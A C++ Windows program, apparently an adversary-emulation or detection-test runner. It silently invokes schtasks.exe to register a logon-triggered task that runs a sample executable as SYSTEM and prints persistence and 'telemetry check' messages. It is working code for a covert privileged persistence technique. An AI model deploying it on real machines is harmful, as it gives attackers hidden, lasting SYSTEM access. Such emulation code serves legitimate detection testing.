#include <windows.h>
#include <iostream>
#include <string>
#include <vector>

int main()
{
    // 1. Target the schtasks executable and build the exact command matching your payload location
    std::wstring applicationPath = L"C:\\Windows\\System32\\schtasks.exe";
    std::wstring commandLine = L"schtasks.exe /create /tn \"A06_3d_Task\" /sc onlogon /tr \"C:\\Users\\Public\\A06_3d_SampleApp.exe\" /ru SYSTEM";

    // 2. Initialize process setup structures safely
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);

    // Opting to hide windows if this runner is ever executed from a non-console frame
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    ZeroMemory(&pi, sizeof(pi));

    std::wcout << L"[*] Attempting to register persistence via schtasks.exe..." << std::endl;
    std::wcout << L"[*] Target Payload: C:\\Users\\Public\\A06_3d_SampleApp.exe" << std::endl;

    // 3. CreateProcessW requires a modifiable/writable buffer for the command line argument.
    // Copying the string to a vector guarantees a null-terminated, continuous, writable memory block.
    std::vector<wchar_t> commandLineBuffer(commandLine.begin(), commandLine.end());
    commandLineBuffer.push_back(L'\0');

    // 4. Launch schtasks.exe to register the logon trigger
    BOOL success = CreateProcessW(
        applicationPath.c_str(),  // Application Name
        commandLineBuffer.data(), // Writable command line buffer
        NULL,                     // Process Attributes
        NULL,                     // Thread Attributes
        FALSE,                    // Inherit Handles
        CREATE_NO_WINDOW,         // Creation Flags (prevents flash of a black console window)
        NULL,                     // Environment
        NULL,                     // Current Directory
        &si,                      // Startup Info
        &pi                       // Process Information
    );

    if (success)
    {
        std::wcout << L"[+] Registration process spawned successfully. PID: " << pi.dwProcessId << std::endl;

        // Wait for schtasks.exe to finish registering the task
        WaitForSingleObject(pi.hProcess, INFINITE);

        DWORD exitCode = 0;
        if (GetExitCodeProcess(pi.hProcess, &exitCode))
        {
            if (exitCode == 0)
            {
                std::wcout << L"[+] Success! 'A06_3d_Task' registered." << std::endl;
                std::wcout << L"[+] Telemetry check: Next system logon will trigger the Session 0 payload." << std::endl;
            }
            else
            {
                std::wcout << L"[-] schtasks.exe failed. Exit code: " << exitCode << std::endl;
                std::wcout << L"[-] Verification check: Ensure this runner is executing with Elevated/Administrator rights." << std::endl;
            }
        }

        // Clean up open handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else
    {
        std::wcout << L"[-] CreateProcessW failed to launch registration tool. Error code: " << GetLastError() << std::endl;
    }

    return 0;
}